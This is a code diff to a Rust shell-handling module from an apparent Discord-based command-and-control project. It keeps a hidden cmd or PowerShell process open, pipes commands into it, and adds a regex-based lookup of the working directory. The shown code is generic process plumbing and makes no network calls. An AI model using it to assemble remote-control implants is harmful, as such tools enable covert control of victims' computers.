@@ -1,3 +1,4 @@
+use std::path::Path;
 use std::process::Stdio;
 use tokio::io::{AsyncWriteExt, BufReader};
 use tokio::process::{Child, Command};
@@ -7,6 +8,7 @@ use crate::errors::DiscordC2Error;
 use lazy_static::lazy_static;
 use tokio::io::AsyncBufReadExt;
 use tokio::time::{timeout, Duration};
+use regex::Regex;
 
 #[derive(Clone, PartialEq, Eq, Debug, Copy)]
 pub enum ShellType {
@@ -15,13 +17,6 @@ pub enum ShellType {
 }
 
 impl ShellType {
-    pub fn _from_str(s: &str) -> Result<ShellType, DiscordC2Error> {
-        match s {
-            "powershell.exe" => Ok(ShellType::Powershell),
-            "cmd.exe" => Ok(ShellType::Cmd),
-            _ => Err(DiscordC2Error::InvalidShellType),
-        }
-    }
     pub fn as_str(&self) -> &str {
         match self {
             ShellType::Powershell => "powershell.exe",
@@ -40,7 +35,7 @@ impl ShellType {
         }
     }
 
-    pub async fn handle_stdin(&self, handler: &ProcessHandler, command: &str) -> Result<(), DiscordC2Error> {
+    async fn handle_stdin(&self, handler: &ProcessHandler, command: &str) -> Result<(), DiscordC2Error> {
         let mut process = handler.process.lock().await;
 
         match self {
@@ -59,6 +54,45 @@ impl ShellType {
                 Ok(())
             }
         }
+    }
+
+    async fn get_current_dir(&self, handler: &ProcessHandler) -> Result<String, DiscordC2Error> {
+        let mut process = handler.process.lock().await;
+
+        let stdin_success: Result<ShellType, DiscordC2Error> = match self {
+            ShellType::Powershell => {
+                process.stdin.as_mut().unwrap().write_all("(Get-Location).Path".as_bytes()).await?;
+                process.stdin.as_mut().unwrap().write_all(b"; echo ___CMDDELIM___").await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(ShellType::Powershell)
+            }
+            ShellType::Cmd => {
+                process.stdin.as_mut().unwrap().write_all("cd".as_bytes()).await?;
+                process.stdin.as_mut().unwrap().write_all(b" & echo ___CMDDELIM___").await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(ShellType::Cmd)
+            }
+        };
+
+        // Declare new string buffer
+        let mut output = String::new();
+
+        // Read the result of the cwd command
+        let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
+        let mut out_lines = stdout_reader.lines();
+        while let Some(line) = out_lines.next_line().await? {
+            if !line.contains("echo") && line.contains("___CMDDELIM___") {
+                break;
+            }
+            output.push_str(&line);
+            output.push('\n');
+        }
+
+        let formatted_output = stdin_success?.format_output(&output);
+        println!("formatted_output: {}", formatted_output);
+        Ok(formatted_output)
     }
 }
 
@@ -80,10 +114,10 @@ impl ProcessHandler {
         })
     }
 
-    pub async fn instance(shell_type: ShellType) -> Result<Arc<Self>, DiscordC2Error> {
+    pub async fn instance(shell_type: &ShellType) -> Result<Arc<Self>, DiscordC2Error> {
         let mut process_handler = PROCESS_HANDLER.lock().await;
         if process_handler.is_none() {
-            let instance = ProcessHandler::new(shell_type).await?;
+            let instance = ProcessHandler::new(*shell_type).await?;
             *process_handler = Some(Arc::new(instance));
         }
         Ok(process_handler.as_ref().unwrap().clone())
@@ -138,7 +172,7 @@ impl ProcessHandler {
 
         let mut process = self.process.lock().await;
         // Read the process's stdout line by line
-        let stdout_reader = BufReader::new( process.stdout.as_mut().unwrap());
+        let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
         let mut out_lines = stdout_reader.lines();
         while let Some(line) = out_lines.next_line().await? {
             if !line.contains("echo") && line.contains("___CMDDELIM___") {
@@ -162,7 +196,7 @@ impl ProcessHandler {
             "powershell.exe" => {
                 println!("Exiting the process");
                 "exit"
-            },
+            }
             _ => panic!("Unsupported shell type"),
         };
 
@@ -177,9 +211,41 @@ impl ProcessHandler {
         Ok(())
     }
 
+    pub async fn current_working_directory(&self) -> Result<String, DiscordC2Error> {
+        let formatted_output = self.shell_type.get_current_dir(self).await?;
+
+        let mut rexed = String::new();
+
+        // Gnarly regex I wrote but it works
+        match self.shell_type {
+            ShellType::Powershell => {
+                let regex = Regex::new(r"\(Get-Location\)\.Path\n(\S+)").map_err(|e| DiscordC2Error::RegexError(e.to_string()))?;
+                let captured = regex.captures(&*formatted_output);
+                rexed = captured.unwrap().get(1)
+                    .ok_or(DiscordC2Error::RegexError(
+                        format!("Couldn't extract the working directory from formatted_output: {}", formatted_output)
+                    ))?.as_str().to_string();
+            }
+            ShellType::Cmd => {
+                let regex = Regex::new(r"cd\s\n(\S+)").map_err(|e| DiscordC2Error::RegexError(e.to_string()))?;
+                let captured = regex.captures(&*formatted_output);
+                rexed = captured.unwrap().get(1)
+                    .ok_or(DiscordC2Error::RegexError(
+                        format!("Couldn't extract the working directory from formatted_output: {}", formatted_output)
+                    ))?.as_str().to_string();
+            }
+        }
+
+        return if Path::new(&rexed).exists()
+        {
+            Ok(rexed)
+        } else {
+            Err(DiscordC2Error::RegexError(format!("The rexed path doesn't exist (Path: {})", rexed)))
+        }
+    }
 }
 
-async fn open_shell(shell_type: ShellType) -> Result<tokio::process::Child, DiscordC2Error> {
+async fn open_shell(shell_type: ShellType) -> Result<Child, DiscordC2Error> {
     let child = Command::new(shell_type.as_str())
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
